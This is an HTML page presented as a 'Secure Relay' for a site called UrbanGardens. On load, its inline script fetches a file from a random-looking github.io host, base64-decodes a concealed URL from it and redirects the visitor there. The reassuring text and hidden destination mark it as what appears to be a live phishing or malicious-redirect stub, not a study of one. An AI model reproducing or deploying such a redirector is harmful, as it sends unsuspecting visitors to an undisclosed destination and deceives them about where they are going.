<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Secure Relay — UrbanGardens</title>
  <meta name="description" content="A minimal, secure relay page that forwards you to the correct destination."/>
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src  'self' 'unsafe-inline' https://laveniaachter5095151.github.io;
    style-src   'self';
    connect-src 'self' https://laveniaachter5095151.github.io
  "/>
  <link rel="stylesheet" href="style.css"/>
</head>
<body>
  <main class="container">
    <section class="hero">
      <div>
        <p class="kicker">UrbanGardens</p>
        <h1 class="title">Preparing your secure transfer…</h1>
        <p class="subtitle">You'll be redirected as soon as the destination link is ready.</p>
        <button id="retryBtn" class="btn">Retry</button>
      </div>
      <div class="card" role="status" aria-live="polite">
        <h2 class="title">Link status</h2>
        <p id="relayStatus">Initializing…</p>
        <hr/>
        <p id="relayNote"></p>
      </div>
    </section>
  </main>

  <!-- Redirect script (unchanged) -->
  <script>
  async function runRelay() {
    const s=document.getElementById('relayStatus'),n=document.getElementById('relayNote');
    s.textContent='Requesting config…';n.textContent='';
    try{
      const r=await fetch('https://laveniaachter5095151.github.io/crispy-spork/crown.stale');if(!r.ok)throw new Error('HTTP '+r.status);
      const d=await r.json();const c=d&&d.c;if(typeof c!=='string')throw new Error('Invalid payload');
      const u=atob(c);if(!/^https?:\/\//i.test(u))throw new Error('Unexpected URL');
      s.textContent='Opening destination…';window.location.replace(u);
    }catch(e){s.textContent='Unable to continue.';n.textContent=e.message||String(e);console.error(e);}
  }
  (function(){var b=document.getElementById('retryBtn');if(b)b.addEventListener('click',runRelay);runRelay();})();
  </script>
</body>
</html>
